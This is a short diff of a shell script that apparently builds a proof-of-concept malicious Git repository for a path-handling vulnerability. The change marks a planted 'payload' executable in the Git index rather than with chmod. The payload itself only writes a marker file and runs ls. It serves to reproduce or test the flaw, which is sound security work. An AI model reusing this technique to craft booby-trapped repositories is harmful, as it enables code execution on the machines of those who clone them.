@@ -14,7 +14,6 @@ printf 'Vulnerable!\n'
 date >~/vulnerable
 exec /bin/ls "$@"
 EOF
-chmod +x payload
 
 upward='..'
 for subdir in .a .b .c .d .e .f .g .h .i .j; do
@@ -24,6 +23,7 @@ for subdir in .a .b .c .d .e .f .g .h .i .j; do
 
     cp -- payload "$standin"
     git add -- "$standin"
+    git update-index --chmod=+x -- "$standin"
 
     standin_pattern="$(printf '%s' "$standin" | sed 's|\.|\\\.|g')"
     cp .git/index old_index
